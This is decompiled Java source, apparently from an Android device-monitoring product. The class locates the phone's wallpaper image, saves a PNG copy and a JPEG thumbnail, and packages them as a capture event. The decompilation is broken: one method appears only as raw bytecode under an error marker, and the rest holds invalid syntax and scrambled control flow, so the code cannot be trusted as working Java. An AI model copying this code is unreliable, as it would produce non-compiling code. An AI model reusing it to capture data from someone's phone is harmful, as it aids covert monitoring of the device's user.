package com.vvt.capture.f.b;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import com.vvt.events.FxMediaType;
import com.vvt.io.p;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.util.UUID;

public class b
  extends a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  
  public b(String paramString)
  {
    super(paramString);
  }
  
  /* Error */
  private boolean a(String paramString1, String paramString2)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_3
    //   2: iconst_0
    //   3: istore 4
    //   5: aconst_null
    //   6: astore 5
    //   8: getstatic 13	com/vvt/capture/f/removeFromPath/removeFromPath:a	Z
    //   11: istore 6
    //   13: iload 6
    //   15: ifeq +3 -> 18
    //   18: getstatic 13	com/vvt/capture/f/removeFromPath/removeFromPath:a	Z
    //   21: istore 6
    //   23: iload 6
    //   25: ifeq +3 -> 28
    //   28: getstatic 13	com/vvt/capture/f/removeFromPath/removeFromPath:a	Z
    //   31: istore 6
    //   33: iload 6
    //   35: ifeq +3 -> 38
    //   38: aconst_null
    //   39: astore 7
    //   41: new 28	java/io/FileInputStream
    //   44: astore 8
    //   46: aload 8
    //   48: aload_1
    //   49: invokespecial 29	java/io/FileInputStream:<init>	(Ljava/lang/String;)V
    //   52: aload 8
    //   54: invokestatic 35	android/graphics/BitmapFactory:decodeStream	(Ljava/io/InputStream;)Landroid/graphics/Bitmap;
    //   57: astore 7
    //   59: new 37	java/lang/Float
    //   62: astore 9
    //   64: aload 7
    //   66: invokevirtual 43	android/graphics/Bitmap:getWidth	()I
    //   69: istore 10
    //   71: iload 10
    //   73: i2f
    //   74: fstore 11
    //   76: aload 9
    //   78: fload 11
    //   80: invokespecial 46	java/lang/Float:<init>	(F)V
    //   83: new 37	java/lang/Float
    //   86: astore 12
    //   88: aload 7
    //   90: invokevirtual 49	android/graphics/Bitmap:getHeight	()I
    //   93: istore 13
    //   95: iload 13
    //   97: i2f
    //   98: fstore 14
    //   100: aload 12
    //   102: fload 14
    //   104: invokespecial 46	java/lang/Float:<init>	(F)V
    //   107: aload 9
    //   109: invokevirtual 53	java/lang/Float:floatValue	()F
    //   112: fstore 15
    //   114: aload 12
    //   116: invokevirtual 53	java/lang/Float:floatValue	()F
    //   119: fstore 11
    //   121: fload 15
    //   123: fload 11
    //   125: fdiv
    //   126: fstore 15
    //   128: fload 15
    //   130: invokestatic 57	java/lang/Float:valueOf	(F)Ljava/lang/Float;
    //   133: astore 9
    //   135: ldc 58
    //   137: istore 10
    //   139: ldc 59
    //   141: fstore 11
    //   143: aload 9
    //   145: invokevirtual 53	java/lang/Float:floatValue	()F
    //   148: fload 11
    //   150: fmul
    //   151: fstore 15
    //   153: fload 15
    //   155: f2i
    //   156: istore 16
    //   158: sipush 800
    //   161: istore 10
    //   163: ldc 60
    //   165: fstore 11
    //   167: iconst_0
    //   168: istore 13
    //   170: fconst_0
    //   171: fstore 14
    //   173: aconst_null
    //   174: astore 17
    //   176: aload 7
    //   178: iload 16
    //   180: iload 10
    //   182: iconst_0
    //   183: invokestatic 64	android/graphics/Bitmap:createScaledBitmap	(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;
    //   186: astore 7
    //   188: new 66	java/io/ByteArrayOutputStream
    //   191: astore 9
    //   193: aload 9
    //   195: invokespecial 69	java/io/ByteArrayOutputStream:<init>	()V
    //   198: getstatic 75	android/graphics/Bitmap$CompressFormat:JPEG	Landroid/graphics/Bitmap$CompressFormat;
    //   201: astore 12
    //   203: bipush 100
    //   205: istore 13
    //   207: ldc 76
    //   209: fstore 14
    //   211: aload 7
    //   213: aload 12
    //   215: iload 13
    //   217: aload 9
    //   219: invokevirtual 80	android/graphics/Bitmap:compress	(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z
    //   222: pop
    //   223: aload 9
    //   225: invokevirtual 84	java/io/ByteArrayOutputStream:toByteArray	()[B
    //   228: astore 12
    //   230: new 86	java/io/FileOutputStream
    //   233: astore 17
    //   235: iconst_1
    //   236: istore 18
    //   238: aload 17
    //   240: aload_2
    //   241: iload 18
    //   243: invokespecial 89	java/io/FileOutputStream:<init>	(Ljava/lang/String;Z)V
    //   246: aload 17
    //   248: aload 12
    //   250: invokevirtual 93	java/io/FileOutputStream:write	([B)V
    //   253: aload 17
    //   255: invokevirtual 96	java/io/FileOutputStream:close	()V
    //   258: aload 9
    //   260: invokevirtual 97	java/io/ByteArrayOutputStream:close	()V
    //   263: aload 7
    //   265: invokevirtual 100	android/graphics/Bitmap:recycle	()V
    //   268: aload 8
    //   270: invokestatic 105	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   273: getstatic 13	com/vvt/capture/f/removeFromPath/removeFromPath:a	Z
    //   276: istore 4
    //   278: iload 4
    //   280: ifeq +3 -> 283
    //   283: iload_3
    //   284: ireturn
    //   285: astore 19
    //   287: iconst_0
    //   288: istore_3
    //   289: aconst_null
    //   290: astore 19
    //   292: getstatic 21	com/vvt/capture/f/removeFromPath/removeFromPath:MyUncaughtExceptionHandler	Z
    //   295: istore 6
    //   297: iload 6
    //   299: ifeq +3 -> 302
    //   302: aload 19
    //   304: invokestatic 105	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   307: iconst_0
    //   308: istore_3
    //   309: aconst_null
    //   310: astore 19
    //   312: goto -39 -> 273
    //   315: astore 19
    //   317: iconst_0
    //   318: istore 6
    //   320: aconst_null
    //   321: astore 8
    //   323: aload 8
    //   325: invokestatic 105	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   328: aload 19
    //   330: athrow
    //   331: astore 19
    //   333: goto -10 -> 323
    //   336: astore 5
    //   338: aload 19
    //   340: astore 8
    //   342: aload 5
    //   344: astore 19
    //   346: goto -23 -> 323
    //   349: astore 19
    //   351: aload 8
    //   353: astore 19
    //   355: goto -63 -> 292
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	358	0	this	removeFromPath
    //   0	358	1	paramString1	String
    //   0	358	2	paramString2	String
    //   1	308	3	bool1	boolean
    //   3	276	4	bool2	boolean
    //   6	1	5	localObject1	Object
    //   336	7	5	localObject2	Object
    //   11	308	6	bool3	boolean
    //   39	225	7	localBitmap	Bitmap
    //   44	308	8	localObject3	Object
    //   62	197	9	localObject4	Object
    //   69	112	10	i	int
    //   74	92	11	f1	float
    //   86	163	12	localObject5	Object
    //   93	123	13	j	int
    //   98	112	14	f2	float
    //   112	42	15	f3	float
    //   156	23	16	k	int
    //   174	80	17	localFileOutputStream	FileOutputStream
    //   236	6	18	bool4	boolean
    //   285	1	19	localException1	Exception
    //   290	21	19	localInputStream	java.io.InputStream
    //   315	14	19	localObject6	Object
    //   331	8	19	localObject7	Object
    //   344	1	19	localObject8	Object
    //   349	1	19	localException2	Exception
    //   353	1	19	localObject9	Object
    // Exception table:
    //   from	to	target	type
    //   41	44	285	java/lang/Exception
    //   48	52	285	java/lang/Exception
    //   41	44	315	finally
    //   48	52	315	finally
    //   52	57	331	finally
    //   59	62	331	finally
    //   64	69	331	finally
    //   78	83	331	finally
    //   83	86	331	finally
    //   88	93	331	finally
    //   102	107	331	finally
    //   107	112	331	finally
    //   114	119	331	finally
    //   128	133	331	finally
    //   143	148	331	finally
    //   182	186	331	finally
    //   188	191	331	finally
    //   193	198	331	finally
    //   198	201	331	finally
    //   217	223	331	finally
    //   223	228	331	finally
    //   230	233	331	finally
    //   241	246	331	finally
    //   248	253	331	finally
    //   253	258	331	finally
    //   258	263	331	finally
    //   263	268	331	finally
    //   292	295	336	finally
    //   52	57	349	java/lang/Exception
    //   59	62	349	java/lang/Exception
    //   64	69	349	java/lang/Exception
    //   78	83	349	java/lang/Exception
    //   83	86	349	java/lang/Exception
    //   88	93	349	java/lang/Exception
    //   102	107	349	java/lang/Exception
    //   107	112	349	java/lang/Exception
    //   114	119	349	java/lang/Exception
    //   128	133	349	java/lang/Exception
    //   143	148	349	java/lang/Exception
    //   182	186	349	java/lang/Exception
    //   188	191	349	java/lang/Exception
    //   193	198	349	java/lang/Exception
    //   198	201	349	java/lang/Exception
    //   217	223	349	java/lang/Exception
    //   223	228	349	java/lang/Exception
    //   230	233	349	java/lang/Exception
    //   241	246	349	java/lang/Exception
    //   248	253	349	java/lang/Exception
    //   253	258	349	java/lang/Exception
    //   258	263	349	java/lang/Exception
    //   263	268	349	java/lang/Exception
  }
  
  private String b()
  {
    String str = p.a(a(), "wallpaper");
    Object localObject = new java/io/File;
    ((File)localObject).<init>(str);
    boolean bool = ((File)localObject).exists();
    if (!bool) {
      ((File)localObject).mkdirs();
    }
    localObject = UUID.randomUUID().toString();
    return p.a(str, (String)localObject);
  }
  
  public com.vvt.capture.f.b a(Context paramContext)
  {
    bool1 = false;
    localObject1 = null;
    bool2 = a;
    if (bool2) {}
    for (;;)
    {
      try
      {
        localObject4 = new java/io/File;
        localObject5 = com.vvt.capture.f.a.b.a();
        ((File)localObject4).<init>((String)localObject5);
        bool2 = ((File)localObject4).exists();
        if (!bool2) {
          continue;
        }
        localObject12 = ((File)localObject4).list();
        int i = localObject12.length;
        j = 0;
        localObject13 = null;
        bool2 = false;
        localObject5 = null;
        if (j >= i) {
          continue;
        }
      }
      finally
      {
        Object localObject11;
        try
        {
          Object localObject4;
          Object localObject12;
          int j;
          String str1;
          File localFile;
          boolean bool5;
          boolean bool6;
          int k;
          boolean bool7;
          Object localObject16;
          boolean bool3;
          long l = ((File)localObject16).length();
          ((com.vvt.capture.f.b)localObject5).a(l);
          l = System.currentTimeMillis();
          ((com.vvt.capture.f.b)localObject5).b(l);
          localObject1 = FxMediaType.JPEG;
          ((com.vvt.capture.f.b)localObject5).a((FxMediaType)localObject1);
          ((com.vvt.capture.f.b)localObject5).a((String)localObject12);
          ((com.vvt.capture.f.b)localObject5).b((String)localObject4);
          bool1 = a;
          if (bool1) {}
          if (localObject13 != null) {
            ((Bitmap)localObject13).recycle();
          }
          bool1 = a;
          if (!bool1) {
            continue;
          }
          continue;
          bool2 = b;
          if (bool2) {}
          bool2 = false;
          Object localObject5 = null;
          continue;
          localObject6 = finally;
          bool2 = false;
          localObject7 = null;
        }
        finally
        {
          Object localObject13;
          Object localObject7;
          Object localObject17;
          Object localObject9;
          Object localObject3 = localObject14;
          continue;
        }
        try
        {
          bool4 = c;
          if ((bool4) && (localObject1 == null)) {
            continue;
          }
          ((Bitmap)localObject1).recycle();
          continue;
        }
        finally
        {
          localObject13 = localObject1;
        }
        if (localObject13 != null) {
          ((Bitmap)localObject13).recycle();
        }
        throw ((Throwable)localObject7);
        Object localObject15 = localObject11;
        continue;
        boolean bool4 = false;
        localObject15 = null;
        continue;
      }
      try
      {
        str1 = localObject12[j];
        localFile = new java/io/File;
        localFile.<init>((File)localObject4, str1);
        bool5 = localFile.isFile();
        if (bool5)
        {
          String str2 = "wallpaper";
          bool6 = str1.contains(str2);
          if (bool6)
          {
            str1 = localFile.getAbsolutePath();
            localObject5 = BitmapFactory.decodeFile(str1);
            if (localObject5 != null)
            {
              localObject13 = localObject5;
              if (localObject13 != null) {
                continue;
              }
            }
          }
        }
      }
      finally
      {
        localObject17 = localObject8;
        bool2 = false;
        localObject9 = null;
        localObject1 = localObject17;
        continue;
      }
      try
      {
        bool2 = c;
        if ((!bool2) || (localObject13 != null)) {
          ((Bitmap)localObject13).recycle();
        }
        bool2 = false;
        localObject5 = null;
        return (com.vvt.capture.f.b)localObject5;
      }
      finally
      {
        bool2 = false;
        localObject11 = null;
        localObject1 = localObject14;
        continue;
      }
      j += 1;
    }
    bool2 = a;
    if (bool2) {}
    localObject5 = new java/io/ByteArrayOutputStream;
    ((ByteArrayOutputStream)localObject5).<init>();
    localObject4 = Bitmap.CompressFormat.PNG;
    k = 100;
    ((Bitmap)localObject13).compress((Bitmap.CompressFormat)localObject4, k, (OutputStream)localObject5);
    bool7 = a;
    if (bool7) {}
    localObject5 = ((ByteArrayOutputStream)localObject5).toByteArray();
    localObject4 = b();
    localObject12 = new java/lang/StringBuilder;
    ((StringBuilder)localObject12).<init>();
    localObject12 = ((StringBuilder)localObject12).append((String)localObject4);
    localObject16 = ".png";
    localObject12 = ((StringBuilder)localObject12).append((String)localObject16);
    localObject12 = ((StringBuilder)localObject12).toString();
    localObject16 = new java/lang/StringBuilder;
    ((StringBuilder)localObject16).<init>();
    localObject4 = ((StringBuilder)localObject16).append((String)localObject4);
    localObject16 = ".thumb.jpg";
    localObject4 = ((StringBuilder)localObject4).append((String)localObject16);
    localObject4 = ((StringBuilder)localObject4).toString();
    bool3 = a;
    if (bool3) {}
    bool3 = a;
    if (bool3) {}
    localObject16 = new java/io/FileOutputStream;
    bool6 = true;
    ((FileOutputStream)localObject16).<init>((String)localObject12, bool6);
    ((FileOutputStream)localObject16).write((byte[])localObject5);
    ((FileOutputStream)localObject16).close();
    bool2 = a((String)localObject12, (String)localObject4);
    bool3 = a;
    if ((!bool3) || (bool2))
    {
      localObject5 = new java/io/File;
      ((File)localObject5).<init>((String)localObject4);
      localObject16 = new java/io/File;
      ((File)localObject16).<init>((String)localObject12);
      bool2 = ((File)localObject5).exists();
      if (bool2)
      {
        localObject5 = new com/vvt/capture/f/b;
        ((com.vvt.capture.f.b)localObject5).<init>();
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/f/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */